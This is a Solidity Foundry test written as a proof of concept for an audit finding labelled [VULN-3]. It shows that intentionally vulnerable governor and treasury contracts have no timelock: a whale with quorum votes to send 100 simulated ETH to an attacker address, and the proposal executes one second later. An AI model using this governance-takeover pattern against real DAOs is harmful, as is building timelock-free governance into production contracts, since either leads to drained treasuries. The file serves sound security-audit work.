// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {VulnX100Governor, IVotesLike} from "../contracts/targets/VulnX100Governor.sol";
import {VulnX100Treasury} from "../contracts/targets/VulnX100Treasury.sol";

/// PoC — [VULN-3] Missing governance timelock.
/// Once the voting window closes and quorum is met, execution is immediate:
/// there is no delay in which holders could exit or a guardian could veto.
contract MissingTimelockTest is Test {
    MockERC20 token;
    VulnX100Governor gov;
    VulnX100Treasury treasury;

    address whale = makeAddr("whale");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockERC20("X100", "X100");
        gov = new VulnX100Governor(IVotesLike(address(token)));
        treasury = new VulnX100Treasury();
        treasury.setGovernor(address(gov));
        gov.setTreasury(address(treasury));

        token.mint(whale, 300_000e18); // >20% quorum of 1,000,000
        token.mint(address(0xdead), 700_000e18);
        vm.deal(address(treasury), 100 ether); // simulated treasury ETH
    }

    function test_no_delay_between_approval_and_execution() public {
        // Proposal: send 100 simulated ETH to attacker.
        uint256 id = gov.propose(attacker, 100 ether, "");

        vm.prank(whale);
        gov.castVote(id, true);

        // The ENTIRE window is `votingPeriod` (1s). Right after it, execution succeeds.
        (, , , , uint64 deadline, ) = gov.proposalInfo(id);
        vm.warp(deadline + 1);

        uint256 before = attacker.balance;
        gov.execute(id);
        uint256 delaySeconds = 1; // deadline+1: the only "wait" is the 1s voting period itself

        assertEq(attacker.balance - before, 100 ether, "EVIDENCE: funds moved on execute");
        assertLt(delaySeconds, 3600, "EVIDENCE: zero timelock delay, well under any safe window");
    }
}
